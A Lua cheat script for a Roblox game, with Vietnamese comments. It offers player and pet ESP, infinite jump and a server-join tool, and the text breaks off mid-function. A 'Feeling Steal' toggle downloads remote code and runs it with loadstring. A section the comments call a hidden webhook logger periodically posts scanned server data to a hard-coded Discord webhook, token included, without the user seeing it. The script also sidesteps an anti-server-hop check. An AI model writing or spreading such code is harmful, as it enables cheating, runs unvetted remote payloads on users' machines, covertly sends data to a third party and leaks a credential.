--// TanPhu Full UI + Helper Tab (ESP Player + Timer ESP + Feeling Steal) + Logger ch·∫°y ng·∫ßm

--======================================================
-- UI Services
--======================================================
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer

-- Toggle UI b·∫±ng ph√≠m LeftControl
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.LeftControl then
        gui.Enabled = not gui.Enabled
    end
end)

--======================================================
-- ScreenGui
--======================================================
local gui = Instance.new("ScreenGui")
gui.Name = "TanPhuUI"
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
local main = Instance.new("Frame")
main.Parent = gui
main.Size = UDim2.new(0, 650, 0, 400)
main.Position = UDim2.new(0.5, -325, 0.5, -200)
main.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
main.BackgroundTransparency = 0.2
main.BorderSizePixel = 0
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)

-- Top Bar
local topBar = Instance.new("Frame")
topBar.Parent = main
topBar.Size = UDim2.new(1, 0, 0, 40)
topBar.BackgroundColor3 = Color3.fromRGB(10, 20, 60)
topBar.BackgroundTransparency = 0.1
topBar.BorderSizePixel = 0
Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel")
title.Parent = topBar
title.Size = UDim2.new(1, -40, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "TanPhu"
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton")
closeBtn.Parent = topBar
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0.5, -15)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 18
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeBtn.AutoButtonColor = true
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

closeBtn.MouseButton1Click:Connect(function()
    gui.Enabled = not gui.Enabled
end)

-- Sidebar
local sidebar = Instance.new("Frame")
sidebar.Parent = main
sidebar.Size = UDim2.new(0, 160, 1, -40)
sidebar.Position = UDim2.new(0, 0, 0, 40)
sidebar.BackgroundColor3 = Color3.fromRGB(15, 30, 60)
sidebar.BackgroundTransparency = 0.2
sidebar.BorderSizePixel = 0

local sideLayout = Instance.new("UIListLayout", sidebar)
sideLayout.Padding = UDim.new(0, 6)
sideLayout.FillDirection = Enum.FillDirection.Vertical

-- Content
local content = Instance.new("Frame")
content.Parent = main
content.Size = UDim2.new(1, -180, 1, -60)
content.Position = UDim2.new(0, 170, 0, 50)
content.BackgroundColor3 = Color3.fromRGB(25, 50, 100)
content.BackgroundTransparency = 0.2
content.BorderSizePixel = 0
Instance.new("UICorner", content).CornerRadius = UDim.new(0, 10)

--======================================================
-- Sidebar Buttons
--======================================================
local sideButtons = {"Main", "Stealer (New)", "Helper", "Player", "Finder", "Server", "Discord"}
local selectedButton
local contentTabs = {}

for _, txt in ipairs(sideButtons) do
    local btn = Instance.new("TextButton")
    btn.Parent = sidebar
    btn.Size = UDim2.new(1, -12, 0, 35)
    btn.Position = UDim2.new(0, 6, 0, 0)
    btn.Text = txt
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 14
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    btn.BackgroundColor3 = Color3.fromRGB(30, 60, 120)
    btn.BackgroundTransparency = 0.3
    btn.AutoButtonColor = false
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

    local tabContent = Instance.new("Frame")
    tabContent.Parent = content
    tabContent.Size = UDim2.new(1, 0, 1, 0)
    tabContent.BackgroundTransparency = 1
    tabContent.Visible = false
    contentTabs[txt] = tabContent

    btn.MouseButton1Click:Connect(function()
        if selectedButton then
            TweenService:Create(selectedButton, TweenInfo.new(0.2), {
                BackgroundColor3 = Color3.fromRGB(30, 60, 120),
                TextColor3 = Color3.fromRGB(200, 200, 200)
            }):Play()
        end
        selectedButton = btn
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = Color3.fromRGB(0, 170, 255),
            TextColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()

        for _, frame in pairs(contentTabs) do
            frame.Visible = false
        end
        tabContent.Visible = true
    end)

    -- Default Helper
    if txt == "Helper" then
        btn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        selectedButton = btn
        tabContent.Visible = true
    end
end

--======================================================
-- Toggle Builder
--======================================================
local function createToggle(parent, text, description, order)
    local frame = Instance.new("Frame")
    frame.Parent = parent
    frame.Size = UDim2.new(1, -20, 0, 50)
    frame.BackgroundColor3 = Color3.fromRGB(40, 80, 160)
    frame.BackgroundTransparency = 0.2
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(0, 10, 0, (order - 1) * 55)
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

    local label = Instance.new("TextLabel")
    label.Parent = frame
    label.Size = UDim2.new(0.7, 0, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.Text = text .. (description ~= "" and ("\n" .. description) or "")
    label.Font = Enum.Font.Gotham
    label.TextSize = 14
    label.TextColor3 = Color3.fromRGB(230, 230, 230)
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.BackgroundTransparency = 1

    local toggle = Instance.new("TextButton")
    toggle.Parent = frame
    toggle.Size = UDim2.new(0, 45, 0, 22)
    toggle.Position = UDim2.new(1, -60, 0.5, -11)
    toggle.Text = ""
    toggle.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
    toggle.AutoButtonColor = false
    Instance.new("UICorner", toggle).CornerRadius = UDim.new(1, 0)

    local knob = Instance.new("Frame")
    knob.Parent = toggle
    knob.Size = UDim2.new(0, 20, 0, 20)
    knob.Position = UDim2.new(0, 1, 0, 1)
    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local state = false
    local callback = nil

    toggle.MouseButton1Click:Connect(function()
        state = not state
        if state then
            TweenService:Create(toggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 170, 255)}):Play()
            TweenService:Create(knob, TweenInfo.new(0.2), {Position = UDim2.new(1, -21, 0, 1)}):Play()
        else
            TweenService:Create(toggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(180, 180, 180)}):Play()
            TweenService:Create(knob, TweenInfo.new(0.2), {Position = UDim2.new(0, 1, 0, 1)}):Play()
        end
        if callback then
            callback(state)
        end
    end)

    return {
        Frame = frame,
        SetCallback = function(fn)
            callback = fn
        end
    }
end

--======================================================
-- Helper Tab
--======================================================
local helperTab = contentTabs["Helper"]

-- ESP Player
local playerESPEnabled = false
local espConnections = {}
local function togglePlayerESP(state)
    playerESPEnabled = state
    if state then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character then
                local highlight = Instance.new("Highlight")
                highlight.FillColor = Color3.fromRGB(0, 0, 255)
                highlight.FillTransparency = 0.7
                highlight.OutlineColor = Color3.fromRGB(0, 0, 255)
                highlight.Parent = plr.Character

                local bb = Instance.new("BillboardGui")
                bb.Name = "ESP_Name"
                bb.Adornee = plr.Character:FindFirstChild("Head")
                bb.Size = UDim2.new(0, 100, 0, 20)
                bb.StudsOffset = Vector3.new(0, 2, 0)
                bb.AlwaysOnTop = true
                bb.Parent = plr.Character

                local tl = Instance.new("TextLabel")
                tl.Size = UDim2.new(1, 0, 1, 0)
                tl.BackgroundTransparency = 1
                tl.Font = Enum.Font.GothamBold
                tl.Text = plr.Name
                tl.TextSize = 14
                tl.TextColor3 = Color3.fromRGB(0, 170, 255)
                tl.Parent = bb
            end
        end
        espConnections[#espConnections+1] = Players.PlayerAdded:Connect(function(plr)
            plr.CharacterAdded:Connect(function(char)
                if playerESPEnabled then
                    local highlight = Instance.new("Highlight")
                    highlight.FillColor = Color3.fromRGB(0, 0, 255)
                    highlight.FillTransparency = 0.7
                    highlight.OutlineColor = Color3.fromRGB(0, 0, 255)
                    highlight.Parent = char

                    local bb = Instance.new("BillboardGui")
                    bb.Name = "ESP_Name"
                    bb.Adornee = char:FindFirstChild("Head")
                    bb.Size = UDim2.new(0, 100, 0, 20)
                    bb.StudsOffset = Vector3.new(0, 2, 0)
                    bb.AlwaysOnTop = true
                    bb.Parent = char

                    local tl = Instance.new("TextLabel")
                    tl.Size = UDim2.new(1, 0, 1, 0)
                    tl.BackgroundTransparency = 1
                    tl.Font = Enum.Font.GothamBold
                    tl.Text = plr.Name
                    tl.TextSize = 14
                    tl.TextColor3 = Color3.fromRGB(0, 170, 255)
                    tl.Parent = bb
                end
            end)
        end)
    else
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                if plr.Character:FindFirstChildOfClass("Highlight") then
                    plr.Character:FindFirstChildOfClass("Highlight"):Destroy()
                end
                if plr.Character:FindFirstChild("ESP_Name") then
                    plr.Character:FindFirstChild("ESP_Name"):Destroy()
                end
            end
        end
        for _, con in ipairs(espConnections) do
            con:Disconnect()
        end
        espConnections = {}
    end
end

local playerESPToggle = createToggle(helperTab, "ESP Player", "Highlight & t√™n ng∆∞·ªùi ch∆°i", 1)
playerESPToggle.SetCallback(togglePlayerESP)

-- ESP Timeline (nh·ªè g·ªçn, ch·ªØ tr·∫Øng)
local _tp_timeline_folder = Instance.new("Folder")
_tp_timeline_folder.Name = "TP_PlotTimeline"
_tp_timeline_folder.Parent = LocalPlayer:WaitForChild("PlayerGui")

local _tp_timeline_active = {}
local _tp_timeline_conn_added = nil
local _tp_timeline_conn_render = nil

local function _tp_attach_timeline(plot)
    if _tp_timeline_active[plot] then return end
    local rem = plot:FindFirstChild("RemainingTime", true)
    local main = plot:FindFirstChild("Main", true) or plot:FindFirstChildWhichIsA("BasePart", true)
    if not rem or not main then return end

    local bb = Instance.new("BillboardGui")
    bb.Name = "TP_Timeline"
    bb.Adornee = main
    bb.Size = UDim2.new(0, 90, 0, 32)
    bb.StudsOffset = Vector3.new(0, 5, 0)
    bb.AlwaysOnTop = true
    bb.Parent = _tp_timeline_folder

    local tl = Instance.new("TextLabel", bb)
    tl.Size = UDim2.new(1, 0, 1, 0)
    tl.BackgroundTransparency = 1
    tl.Font = Enum.Font.Gotham
    tl.TextScaled = true
    tl.TextColor3 = Color3.fromRGB(255,255,255)
    tl.TextStrokeTransparency = 0.5

    _tp_timeline_active[plot] = {Gui = bb, Label = tl, Rem = rem}
end

local function _tp_clear_timeline()
    for plot, data in pairs(_tp_timeline_active) do
        if data.Gui and data.Gui.Parent then data.Gui:Destroy() end
    end
    _tp_timeline_active = {}
end

local function _tp_enable_timeline()
    -- attach existing plotblocks
    for _, m in ipairs(Workspace:GetDescendants()) do
        if m:IsA("Model") and m.Name == "PlotBlock" then
            pcall(function() _tp_attach_timeline(m) end)
        end
    end
    -- watch new ones
    _tp_timeline_conn_added = Workspace.DescendantAdded:Connect(function(m)
        if m:IsA("Model") and m.Name == "PlotBlock" then
            pcall(function() _tp_attach_timeline(m) end)
        end
    end)
    -- render update
    _tp_timeline_conn_render = RunService.RenderStepped:Connect(function()
        for plot, data in pairs(_tp_timeline_active) do
            if data.Rem and data.Rem.Parent then
                local n = tonumber(string.match(tostring(data.Rem.Text or ""), "(%d+)"))
                if n and n > 0 then
                    data.Label.Text = tostring(n) .. "s"
                    data.Gui.Enabled = true
                else
                    if data.Gui then data.Gui.Enabled = false end
                end
            else
                if data.Gui then data.Gui.Enabled = false end
            end
        end
    end)
end

local function _tp_disable_timeline()
    if _tp_timeline_conn_added then _tp_timeline_conn_added:Disconnect() _tp_timeline_conn_added = nil end
    if _tp_timeline_conn_render then _tp_timeline_conn_render:Disconnect() _tp_timeline_conn_render = nil end
    _tp_clear_timeline()
end

-- Toggle trong Helper (order = 2 ho·∫∑c t√πy b·∫°n)
createToggle(contentTabs["Helper"], "ESP Timeline", "Hi·ªán timer plot (tr·∫Øng nh·ªè)", 2).SetCallback(function(state)
    if state then _tp_enable_timeline() else _tp_disable_timeline() end
end)

-- Feeling Steal (load/kill)
local _tp_steal_thread = nil
local _tp_steal_toggle = createToggle(contentTabs["Helper"], "Feeling Steal", "Auto steal (load/kill)", 3)

_tp_steal_toggle.SetCallback(function(state)
    if state then
        if _tp_steal_thread then task.cancel(_tp_steal_thread) _tp_steal_thread = nil end
        _tp_steal_thread = task.spawn(function()
            local ok, err = pcall(function()
                local code = game:HttpGet("https://api.luarmor.net/files/v3/loaders/a3e13a4a85ac4c2da17a6baab051ee1b.lua")
                local fn = loadstring(code)
                if fn then fn() end
            end)
            if not ok then warn("[Feeling Steal] load error:", err) end
        end)
    else
        -- c·ªë g·∫Øng kill thread; n·∫øu script remote t·∫°o connection ri√™ng th√¨ kh√¥ng ch·∫Øc 100% d·ª´ng h·∫øt
        if _tp_steal_thread then
            task.cancel(_tp_steal_thread)
            _tp_steal_thread = nil
        end
        warn("[Feeling Steal] Toggle off: ƒë√£ cancel thread (n·∫øu script remote v·∫´n ch·∫°y, c·∫ßn reload game ƒë·ªÉ d·ªçn s·∫°ch).")
    end
end)

--======================================================
-- ESP Pets (Brainrot) - loose name match anywhere + white/black UI
--======================================================
do
    -- Danh s√°ch pet c·∫ßn hi·ªán
    local _pet_rules = {
        { k = "graipuss medussi",      min = 10_000_000,   max = 20_000_000   },
        { k = "la grande combinasion", min = 10_000_000,   max = 300_000_000  },
        { k = "los combinasionas",     min = 15_000_000,   max = 400_000_000  },
        { k = "nuclearo dinossauro",   min = 15_000_000,   max = 300_000_000  },
        { k = "los hotspotsitos",      min = 20_000_000,   max = 400_000_000  },
        { k = "garama and madundung",  min = 50_000_000,   max = 2_000_000_000},
    }

    local function _norm(s) return tostring(s or ""):lower() end

    local function _get_rule_hit_in_tree(root)
        -- Tr·∫£ v·ªÅ (rule, hitText) n·∫øu th·∫•y t√™n ·ªü Name ho·∫∑c trong TextLabel/StringValue
        local nameL = _norm(root.Name)
        for _,r in ipairs(_pet_rules) do
            if nameL:find(r.k, 1, true) then return r, root.Name end
        end
        local ok, descs = pcall(root.GetDescendants, root)
        if ok and type(descs)=="table" then
            for i=1,#descs do
                local d = descs[i]
                -- check name
                local dn = _norm(d.Name)
                for _,r in ipairs(_pet_rules) do
                    if dn:find(r.k, 1, true) then return r, d.Name end
                end
                -- check text value
                if d:IsA("TextLabel") or d:IsA("TextButton") then
                    local t = _norm(d.Text)
                    for _,r in ipairs(_pet_rules) do
                        if t:find(r.k, 1, true) then return r, d.Text end
                    end
                elseif d:IsA("StringValue") then
                    local v = _norm(d.Value)
                    for _,r in ipairs(_pet_rules) do
                        if v:find(r.k, 1, true) then return r, d.Value end
                    end
                end
            end
        end
        return nil
    end

    -- Parse $/s
    local function _parse_mps(val)
        if typeof(val) == "number" then return val end
        local s = _norm(val)
        local num = tonumber((s:match("([%d%.]+)")) or "0") or 0
        if s:find("b",1,true) then num = num * 1e9
        elseif s:find("m",1,true) then num = num * 1e6
        elseif s:find("k",1,true) then num = num * 1e3 end
        return math.floor(num + 0.5)
    end
    local function _text_is_per_sec(txt)
        local s = _norm(txt)
        return s:find("/s",1,true) or s:find("per%s*sec") or s:find("per%s*second")
    end
    local _deny = {"offline","cash","total","bank","balance","wallet","coins","gems","price","cost","buy","sell","collect","collected"}
    local function _has_token(s, toks)
        s = _norm(s)
        for _,t in ipairs(toks) do if s:find(t,1,true) then return true end end
        return false
    end

    local function _collect_prices(container)
        local list = {}
        local ok, descs = pcall(container.GetDescendants, container)
        if not ok or type(descs) ~= "table" then return list end
        for i=1,#descs do
            local d = descs[i]
            local nm_l = _norm(d.Name)
            if not _has_token(nm_l, _deny) then
                if d:IsA("TextLabel") or d:IsA("TextButton") then
                    local t = d.Text or ""
                    if t ~= "" and _text_is_per_sec(t) and not _has_token(t, _deny) then
                        local n = _parse_mps(t); if n > 0 then list[#list+1] = n end
                    end
                elseif d:IsA("StringValue") then
                    local v = d.Value
                    if type(v)=="string" and _text_is_per_sec(v) and not _has_token(v,_deny) then
                        local n = _parse_mps(v); if n > 0 then list[#list+1] = n end
                    end
                elseif d:IsA("NumberValue") or d:IsA("IntValue") then
                    local n = tonumber(d.Value) or 0
                    if n > 0 then list[#list+1] = n end
                end
            end
        end
        return list
    end

    local function _fmt_short(n)
        n = tonumber(n) or 0
        if n >= 1e9 then return ("$%.2fB/s"):format(n/1e9):gsub("%.?0+B","B")
        elseif n >= 1e6 then return ("$%.2fM/s"):format(n/1e6):gsub("%.?0+M","M")
        elseif n >= 1e3 then return ("$%.2fK/s"):format(n/1e3):gsub("%.?0+K","K")
        else return ("$%d/s"):format(n) end
    end

    local petESPEnabled = false
    local petESPItems = {}
    local addedConn

    local function _cleanup_one(m)
        local rec = petESPItems[m]
        if rec then
            if rec.hl and rec.hl.Parent then rec.hl:Destroy() end
            if rec.gui and rec.gui.Parent then rec.gui:Destroy() end
            petESPItems[m] = nil
        end
    end

    local function _attach_one(model)
        if petESPItems[model] then return end

        -- 1) T√™n tr√πng ·ªü b·∫•t k·ª≥ ƒë√¢u trong model?
        local rule, hitText = _get_rule_hit_in_tree(model)
        if not rule then return end

        -- 2) BasePart ƒë·ªÉ b√°m label
        local adornee = model:FindFirstChild("Head") or model:FindFirstChildWhichIsA("BasePart", true)
        if not adornee then return end

        -- 3) L·∫•y gi√° (n·∫øu c√≥) ‚Äì KH√îNG b·∫Øt bu·ªôc
        local prices = {}
        local function add(src)
            if not src then return end
            local ok, list = pcall(_collect_prices, src)
            if ok and type(list)=="table" then for i=1,#list do prices[#prices+1]=list[i] end end
        end
        add(model); add(model.Parent)
        table.sort(prices)

        -- 4) Highlight + label tr·∫Øng‚Äìƒëen
        local hl = Instance.new("Highlight")
        hl.FillColor = Color3.fromRGB(255,255,255)
        hl.FillTransparency = 0.9
        hl.OutlineColor = Color3.fromRGB(255,255,255)
        hl.OutlineTransparency = 0.25
        hl.Parent = model

        local bb = Instance.new("BillboardGui")
        bb.Name = "TP_PetESP"
        bb.Adornee = adornee
        bb.Size = UDim2.new(0, 120, 0, 24)
        bb.StudsOffset = Vector3.new(0, 3.5, 0)
        bb.AlwaysOnTop = true
        bb.LightInfluence = 0
        bb.Parent = model

        local holder = Instance.new("Frame")
        holder.Parent = bb
        holder.Size = UDim2.new(1, 0, 1, 0)
        holder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        holder.BackgroundTransparency = 0.25
        holder.BorderSizePixel = 0
        Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 6)

        local tl = Instance.new("TextLabel")
        tl.Parent = holder
        tl.Size = UDim2.new(1, -10, 1, -2)
        tl.Position = UDim2.new(0, 5, 0, 1)
        tl.BackgroundTransparency = 1
        tl.Font = Enum.Font.GothamSemibold
        tl.TextScaled = true
        tl.TextXAlignment = Enum.TextXAlignment.Center
        tl.TextYAlignment = Enum.TextYAlignment.Center
        tl.TextColor3 = Color3.fromRGB(255,255,255)
        tl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
        tl.TextStrokeTransparency = 0
        local tsc = Instance.new("UITextSizeConstraint")
        tsc.Parent = tl
        tsc.MinTextSize = 10
        tsc.MaxTextSize = 18

        -- 5) Text hi·ªÉn th·ªã: t√™n (∆∞u ti√™n hitText) + gi√° n·∫øu ƒë·ªçc ƒë∆∞·ª£c
        local nameText = tostring(hitText or model.Name)
        local tag = nameText
        if #prices >= 2 then
            tag = ("%s  (%s ‚Üí %s)"):format(nameText, _fmt_short(prices[1]), _fmt_short(prices[#prices]))
        elseif #prices == 1 then
            tag = ("%s  (%s)"):format(nameText, _fmt_short(prices[1]))
        end
        tl.Text = tag

        model.AncestryChanged:Connect(function(_, parent)
            if not parent then _cleanup_one(model) end
        end)

        petESPItems[model] = {hl = hl, gui = bb}
    end

    local function _enable_pet_esp()
        for _,m in ipairs(Workspace:GetDescendants()) do
            if m:IsA("Model") then pcall(_attach_one, m) end
        end
        addedConn = Workspace.DescendantAdded:Connect(function(inst)
            if petESPEnabled and inst:IsA("Model") then pcall(_attach_one, inst) end
        end)
    end

    local function _disable_pet_esp()
        if addedConn then addedConn:Disconnect() addedConn=nil end
        for m,_ in pairs(petESPItems) do _cleanup_one(m) end
    end

    local petESPToggle = createToggle(contentTabs["Helper"], "ESP Pets (Brainrot)", "Highlight pet + Money/s", 4)
    petESPToggle.SetCallback(function(state)
        petESPEnabled = state
        if state then _enable_pet_esp() else _disable_pet_esp() end
    end)
end

--======================================================
-- Player Tab
--======================================================
local playerTab = contentTabs["Player"]

-- Bi·∫øn Infinite Jump
local infJumpEnabled = false
local HRP

-- C·∫≠p nh·∫≠t HRP khi nh√¢n v·∫≠t spawn
RunService.RenderStepped:Connect(function()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        HRP = LocalPlayer.Character.HumanoidRootPart
    end
end)

-- L·∫Øng nghe ph√≠m Space khi b·∫≠t Infinite Jump
UserInputService.InputBegan:Connect(function(input, processed)
    if infJumpEnabled and input.KeyCode == Enum.KeyCode.Space and HRP then
        HRP.Velocity = Vector3.new(HRP.Velocity.X, 50, HRP.Velocity.Z)
    end
end)

-- Toggle trong menu
local infJumpToggle = createToggle(playerTab, "Infinite Jump", "Nh·∫£y kh√¥ng gi·ªõi h·∫°n", 1)
infJumpToggle.SetCallback(function(state)
    infJumpEnabled = state
end)

-- ====== Server tab: Join Job ID (EN status messages, no hint) ======
local TeleportService = game:GetService("TeleportService")
local DEST_PLACE_ID = 109983668079237 -- Brainrot; n·∫øu mu·ªën theo game hi·ªán t·∫°i: DEST_PLACE_ID = game.PlaceId

-- Base64 helpers
local _b64Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _tp_b64_decode(data)
    data = tostring(data or ""):gsub("[^%w%+/%=]", "")
    local t, bitBuffer = {}, ""
    for i = 1, #data do
        local ch = data:sub(i,i)
        if ch ~= "=" then
            local idx = _b64Alphabet:find(ch, 1, true)
            if idx then
                idx = idx - 1
                local bits = ""
                for b = 6,1,-1 do
                    bits = bits .. ((idx % 2^b - idx % 2^(b-1) > 0) and "1" or "0")
                end
                bitBuffer = bitBuffer .. bits
            end
        end
    end
    for j = 1, #bitBuffer, 8 do
        local byte = bitBuffer:sub(j, j+7)
        if #byte == 8 then
            local c = 0
            for k = 1,8 do
                if byte:sub(k,k) == "1" then
                    c = c + 2^(8-k)
                end
            end
            t[#t+1] = string.char(c)
        end
    end
    return table.concat(t)
end

local function _tp_sanitizeJobIdInput(s)
    s = tostring(s or ""):gsub("`", "")
    s = s:gsub("\r",""):gsub("\n",""):gsub("^%s+",""):gsub("%s+$","")
    return s
end

local function _tp_guessJobId(str)
    str = _tp_sanitizeJobIdInput(str)
    if str:find("%-") and #str >= 30 then return str end
    local ok, decoded = pcall(_tp_b64_decode, str)
    if ok and decoded and #decoded >= 30 and decoded:find("%-") then return decoded end
    return str
end

do
    local serverTab = contentTabs["Server"]

    local title = Instance.new("TextLabel")
    title.Parent = serverTab
    title.Size = UDim2.new(1, -20, 0, 28)
    title.Position = UDim2.new(0, 10, 0, 10)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.TextColor3 = Color3.fromRGB(230,230,230)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Text = "Join Job ID"  -- << g·ªçn theo y√™u c·∫ßu

    local box = Instance.new("TextBox")
    box.Parent = serverTab
    box.Size = UDim2.new(1, -20, 0, 36)
    box.Position = UDim2.new(0, 10, 0, 48)
    box.PlaceholderText = ""      -- << kh√¥ng ghi ch√∫
    box.Text = ""
    box.ClearTextOnFocus = false
    box.Font = Enum.Font.Gotham
    box.TextSize = 14
    box.TextColor3 = Color3.fromRGB(255,255,255)
    box.BackgroundColor3 = Color3.fromRGB(30, 60, 120)
    box.BackgroundTransparency = 0.2
    Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)

    local joinBtn = Instance.new("TextButton")
    joinBtn.Parent = serverTab
    joinBtn.Size = UDim2.new(0, 140, 0, 36)
    joinBtn.Position = UDim2.new(0, 10, 0, 92)
    joinBtn.Text = "Join server"
    joinBtn.Font = Enum.Font.GothamSemibold
    joinBtn.TextSize = 14
    joinBtn.TextColor3 = Color3.fromRGB(255,255,255)
    joinBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    joinBtn.AutoButtonColor = true
    Instance.new("UICorner", joinBtn).CornerRadius = UDim.new(0, 8)

    local statusLbl = Instance.new("TextLabel")
    statusLbl.Parent = serverTab
    statusLbl.Size = UDim2.new(1, -20, 0, 22)
    statusLbl.Position = UDim2.new(0, 10, 0, 134)
    statusLbl.BackgroundTransparency = 1
    statusLbl.Font = Enum.Font.Gotham
    statusLbl.TextSize = 13
    statusLbl.TextColor3 = Color3.fromRGB(200,230,255)
    statusLbl.TextXAlignment = Enum.TextXAlignment.Left
    statusLbl.Text = ""

    local busy = false
    local function setStatus(t) statusLbl.Text = t or "" end

    joinBtn.MouseButton1Click:Connect(function()
        if busy then return end
        local raw = box.Text or ""
        if raw == "" then setStatus("‚ö†Ô∏è Please paste a Job ID first.") return end
        local jobId = _tp_guessJobId(raw)
        if not jobId or #jobId < 30 then setStatus("‚ùå Invalid Job ID.") return end
        busy = true
        setStatus("‚è≥ Joining " .. jobId .. " ...")
        task.spawn(function()
            -- BYPASS 3s ƒë·ªÉ Anti Server Hop kh√¥ng ch·∫∑n l·∫ßn join n√†y
            if getgenv().TP_ALLOW_JOIN then getgenv().TP_ALLOW_JOIN(3) end

            local ok, err = pcall(function()
                TeleportService:TeleportToPlaceInstance(DEST_PLACE_ID, jobId, LocalPlayer)
            end)
            if not ok then
                setStatus("‚ùå Join error: " .. tostring(err))
            else
                setStatus("‚úÖ Teleport requested. If you didn't move, try again.")
            end
            task.wait(1.5)
            busy = false
        end)
    end)
end

-- ====== Webhook ·∫©n: qu√©t ƒë·ªãnh k·ª≥ theo RULES, kh√¥ng log F9 ======
local TP_DEBUG        = false
local TP_ONE_SHOT     = false
local TP_FIRST_DELAY  = 5
local TP_SCAN_INTERVAL= 60
local TP_WEBHOOK_URL  = "https://discordapp.com/api/webhooks/1410314122670903491/KD8clDHrbOMKlArHAoEyMXTqQGD6AAN7ftlYvdkFEOj5a9_VEGA9yqAhoH2XPK77TITb"

local TP_RULES = {
  { k = "graipuss medussi",      min = 10_000_000,   max = 20_000_000   },
  { k = "la grande combinasion", min = 10_000_000,   max = 300_000_000  },
  { k = "los combinasionas",     min = 15_000_000,   max = 400_000_000  },
  { k = "nuclearo dinossauro",   min = 15_000_000,   max = 300_000_000  },
  { k = "los hotspotsitos",      min = 20_000_000,   max = 400_000_000  },
  { k = "garama and madundung",  min = 50_000_000,   max = 2_000_000_000},
}

local TP_MAX_CARDS_PER_SERVER = 5
local TP_reported_once = false
local TP_sent_global = {}

local function TP_http_post(url, tbl)
  local HttpService = game:GetService("HttpService")
  local body = HttpService:JSONEncode(tbl)
  local headers = {["Content-Type"]="application/json"}
  local req = (syn and syn.request) or http_request or request or (http and http.request)
  if not req then return false end
  local ok, res = pcall(function() return req({Url=url, Method="POST", Headers=headers, Body=body}) end)
  if ok and res and (res.StatusCode==204 or res.StatusCode==200) then return true end
  if ok and res and res.StatusCode==429 then
    local h = res.Headers or res.headers or {}
    local retry = tonumber(h["Retry-After"] or h["retry-after"] or 2) or 2
    task.wait(math.clamp(retry,1,10))
    res = req({Url=url, Method="POST", Headers=headers, Body=body})
    if res and (res.StatusCode==204 or res.StatusCode==200) then return true end
  end
  return false
end

local function TP_fmt(n)
  n = tonumber(n) or 0
  local abs, unit, val = math.abs(n), "/s", n
  if abs >= 1e9 then val, unit = n/1e9, "B/s"
  elseif abs >= 1e6 then val, unit = n/1e6, "M/s"
  elseif abs >= 1e3 then val, unit = n/1e3, "K/s" end
  return ("$%s%s"):format(tostring(("%.2f"):format(val):gsub("%.?0+$","")), unit)
end

local function TP_b64(s)
  local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
  return ((s:gsub('.', function(x)
    local r,bits='',x:byte()
    for i=8,1,-1 do r=r..(bits%2^i-bits%2^(i-1)>0 and '1' or '0') end
    return r
  end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
    if (#x<6) then return '' end
    local c=0; for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
    return b:sub(c+1,c+1)
  end)..({ '', '==', '=' })[#s%3+1])
end

local function TP_parse_mps(val)
  if typeof(val) == "number" then return val end
  if typeof(val) ~= "string" then return 0 end
  local s = val:lower()
  local num = tonumber((s:match("([%d%.]+)")) or "0") or 0
  if s:find("b") then num = num*1e9
  elseif s:find("m") then num = num*1e6
  elseif s:find("k") then num = num*1e3 end
  return math.floor(num + 0.5)
end

-- strict collect per-second
local TP_ALLOW = {"mps","moneypersec","money_per_sec","moneypersecond","persec","per_second"}
local TP_DENY  = {"offline","cash","total","bank","balance","wallet","coins","gems","price","cost","buy","sell","collect","collected"}

local function TP_has_token(s, toks)
  s = tostring(s or ""):lower()
